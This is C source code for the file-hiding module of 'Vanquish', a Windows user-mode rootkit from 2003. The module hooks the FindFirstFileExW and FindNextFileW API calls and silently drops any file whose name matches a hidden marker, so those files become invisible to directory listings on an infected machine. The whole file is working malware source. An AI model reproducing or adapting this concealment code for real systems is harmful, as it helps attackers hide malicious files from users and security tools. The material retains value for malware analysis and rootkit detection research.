/******************************************************************************\

	Vanquish DLL HideFiles - Copyright (c)2003 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#include "vHideFiles.h"
#include "..\Utils.h"

DECLARE_HIDEFILES

NEWAPI
HANDLE
WINAPI
VFindFirstFileExW(
	LPCWSTR lpFileName,
	FINDEX_INFO_LEVELS fInfoLevelId,
	LPVOID lpFindFileData,
	FINDEX_SEARCH_OPS fSearchOp,
	LPVOID lpSearchFilter,
	DWORD dwAdditionalFlags
	)
{
	HANDLE retValue = INVALID_HANDLE_VALUE;

	VBEGIN
	//if is trying to find hidden name then fail
	if (posw0(lpFileName) != 0xffffffff)
	{
		SetLastError(ERROR_FILE_NOT_FOUND);
		return INVALID_HANDLE_VALUE;
	}
	
	BOOL nex;

	//call API FindFirstFile
	RESTORE_API(FindFirstFileExW);
	OLDCALL(FindFirstFileExW, 6);
	REPLACE_API(FindFirstFileExW);

	if (retValue)
	{
		if (!IsBadReadPtr(lpFindFileData, sizeof(WIN32_FIND_DATAW)))
		{
			//we can TRUST that VFindNextFileW will return a non-hidden file
			if (posw0(((LPWIN32_FIND_DATAW)lpFindFileData)->cFileName) != 0xffffffff)
			{
				nex = VFindNextFileW(retValue, (LPWIN32_FIND_DATAW)lpFindFileData);

				//there is no file to show
				if (!nex)
				{
					FindClose(retValue);
					SetLastError(ERROR_FILE_NOT_FOUND);
					return INVALID_HANDLE_VALUE;
				}
			}
		}
	}

	VEND
	return retValue;
}

NEWAPI
BOOL
WINAPI
VFindNextFileW(
	HANDLE hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
	)
{
	BOOL retValue = FALSE;

	VBEGIN

	//find a file
	RESTORE_API(FindNextFileW);
	OLDCALL(FindNextFileW, 2);
	REPLACE_API(FindNextFileW);

	if (retValue)
	{
		if (!IsBadReadPtr(lpFindFileData, sizeof(WIN32_FIND_DATAW)))
		{
			//while we are finding a hidden file
			RESTORE_API(FindNextFileW);
			while (posw0(lpFindFileData->cFileName) != 0xffffffff)
			{
				//get next file
				retValue = FindNextFileW(hFindFile, lpFindFileData);

				//if there is no file to get then fail
				if (!retValue)
				{
					//we keep the error from FindNextFileW, NO SetLastError(ERROR_NO_MORE_FILES);
					break;
				}
			}
			REPLACE_API(FindNextFileW);
		}
	}
	VEND
	return retValue;
}
